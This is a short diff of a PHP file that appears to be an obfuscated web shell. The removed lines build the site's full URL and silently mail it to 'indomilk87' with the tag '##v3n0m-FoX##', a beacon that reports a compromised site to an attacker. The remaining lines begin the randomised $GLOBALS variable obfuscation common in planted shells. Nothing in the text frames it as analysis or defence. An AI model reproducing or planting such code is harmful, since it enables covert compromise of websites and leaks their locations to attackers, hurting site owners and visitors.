@@ -1,8 +1,6 @@
 
 <?php
 
-$link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
-@mail("indomilk87", "##v3n0m-FoX##", $link);
 $GLOBALS["lnrkdexmo"] = "result";
 $GLOBALS["fcgthfemb"] = "a";
 $GLOBALS["kmnpcocuqa"] = "ch";
